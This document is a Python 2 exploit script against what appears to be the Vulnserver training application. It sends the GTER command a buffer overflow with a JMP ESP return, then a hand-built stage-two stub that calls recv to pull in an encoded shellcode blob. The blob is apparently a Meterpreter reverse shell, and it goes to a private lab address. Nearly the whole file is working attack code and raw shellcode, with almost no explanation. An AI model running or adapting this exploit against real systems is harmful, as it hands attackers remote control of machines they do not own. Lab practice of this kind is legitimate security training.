#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
from struct import pack
import time

host = '172.16.192.168'
port = 9999

rev_met_7887 =  ""
rev_met_7887 += "\xdb\xc2\xbb\x35\x0e\x19\x40\xd9\x74\x24\xf4"
rev_met_7887 += "\x58\x29\xc9\xb1\x56\x31\x58\x18\x03\x58\x18"
rev_met_7887 += "\x83\xe8\xc9\xec\xec\xbc\xd9\x73\x0e\x3d\x19"
rev_met_7887 += "\x14\x86\xd8\x28\x14\xfc\xa9\x1a\xa4\x76\xff"
rev_met_7887 += "\x96\x4f\xda\x14\x2d\x3d\xf3\x1b\x86\x88\x25"
rev_met_7887 += "\x15\x17\xa0\x16\x34\x9b\xbb\x4a\x96\xa2\x73"
rev_met_7887 += "\x9f\xd7\xe3\x6e\x52\x85\xbc\xe5\xc1\x3a\xc9"
rev_met_7887 += "\xb0\xd9\xb1\x81\x55\x5a\x25\x51\x57\x4b\xf8"
rev_met_7887 += "\xea\x0e\x4b\xfa\x3f\x3b\xc2\xe4\x5c\x06\x9c"
rev_met_7887 += "\x9f\x96\xfc\x1f\x76\xe7\xfd\x8c\xb7\xc8\x0f"
rev_met_7887 += "\xcc\xf0\xee\xef\xbb\x08\x0d\x8d\xbb\xce\x6c"
rev_met_7887 += "\x49\x49\xd5\xd6\x1a\xe9\x31\xe7\xcf\x6c\xb1"
rev_met_7887 += "\xeb\xa4\xfb\x9d\xef\x3b\x2f\x96\x0b\xb7\xce"
rev_met_7887 += "\x79\x9a\x83\xf4\x5d\xc7\x50\x94\xc4\xad\x37"
rev_met_7887 += "\xa9\x17\x0e\xe7\x0f\x53\xa2\xfc\x3d\x3e\xaa"
rev_met_7887 += "\x31\x0c\xc1\x2a\x5e\x07\xb2\x18\xc1\xb3\x5c"
rev_met_7887 += "\x10\x8a\x1d\x9a\x21\x9c\x9d\x74\x89\xcd\x63"
rev_met_7887 += "\x75\xe9\xc4\xa7\x21\xb9\x7e\x01\x4a\x52\x7f"
rev_met_7887 += "\xae\x9f\xce\x75\x38\x8c\x1e\x4a\x11\xa4\x1c"
rev_met_7887 += "\x4a\x7c\xfa\xa9\xac\xd0\x54\xf9\x60\x91\x04"
rev_met_7887 += "\xb9\xd0\x79\x4f\x36\x0e\x99\x70\x9d\x27\x30"
rev_met_7887 += "\x9f\x4b\x1f\xad\x06\xd6\xeb\x4c\xc6\xcd\x91"
rev_met_7887 += "\x4f\x4c\xe7\x66\x01\xa5\x82\x74\x76\xd2\x6c"
rev_met_7887 += "\x85\x87\x77\x6c\xef\x83\xd1\x3b\x87\x89\x04"
rev_met_7887 += "\x0b\x08\x71\x63\x08\x4f\x8d\xf2\x38\x3b\xb8"
rev_met_7887 += "\x60\x04\x53\xc5\x64\x84\xa3\x93\xee\x84\xcb"
rev_met_7887 += "\x43\x4b\xd7\xee\x8b\x46\x44\xa3\x19\x69\x3c"
rev_met_7887 += "\x17\x89\x01\xc2\x4e\xfd\x8d\x3d\xa5\x7d\xc9"
rev_met_7887 += "\xc1\x3b\xaa\x72\xa9\xc3\xea\x82\x29\xae\xea"
rev_met_7887 += "\xd2\x41\x25\xc4\xdd\xa1\xc6\xcf\xb5\xa9\x4d"
rev_met_7887 += "\x9e\x74\x48\x51\x8b\xd9\xd4\x52\x38\xc2\xe7"
rev_met_7887 += "\x29\x31\xf5\x08\xce\x5b\x92\x09\xce\x63\xa4"
rev_met_7887 += "\x36\x18\x5a\xd2\x79\x98\xd9\xed\xcc\xbd\x48"
rev_met_7887 += "\x64\x2e\x91\x8b\xad"

jmp_esp = pack("<L",0x62501205)
jmp_to_start  = "\x54\x5A"
jmp_to_start += "\x80\xEE\x01"
jmp_to_start += "\x80\xC2\x69"
jmp_to_start += "\xFF\xE2"

stage_two  = "\x54"  				# PUSH ESP
stage_two += "\x58"  				# POP EAX
stage_two += "\x80\xC4\x01" 		# ADD AH,1
stage_two += "\x04\x88" 			# ADD AL,88
stage_two += "\x83\xEC\x70" 		# SUB ESP,70
stage_two += "\x83\xEC\x30"			# SUB ESP,30
stage_two += "\x33\xDB" 			# XOR EBX,EBX
stage_two += "\x53"  				# PUSH EBX
stage_two += "\xB7\x02"  			# MOV BH,2
stage_two += "\x53" 				# PUSH EBX
stage_two += "\x54" 			 	# PUSH ESP
stage_two += "\x5B" 				# POP EBX
stage_two += "\x83\xC3\x70"			# ADD EBX,70
stage_two += "\x53"			 		# PUSH EBX
stage_two += "\xFF\x30" 			# PUSH DWORD PTR [ECX]
stage_two += "\xBB\x44\x2C\x25\x40" # MOV EBX,40252C44
stage_two += "\xC1\xEB\x08" 		# SHR EBX,8
stage_two += "\xFF\xD3"				# CALL EBX

payload  = stage_two 
payload += "A" * (147 - len(stage_two))
payload += jmp_esp
payload += jmp_to_start
payload += "\x90" * (512 - len(rev_met_7887))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print s.recv(1024)
print "[*] Sending payload of size: {0} chars...".format(len(payload))
s.send("GTER /.:/" + payload + "\r\n")
time.sleep(2)
s.send(rev_met_7887)
s.send("\x90" * 512)
s.close()

# 0040252C=<JMP.&WS2_32.recv>
#
# socket descript is offset ESP 188 at time of 2nd stage value 80
# 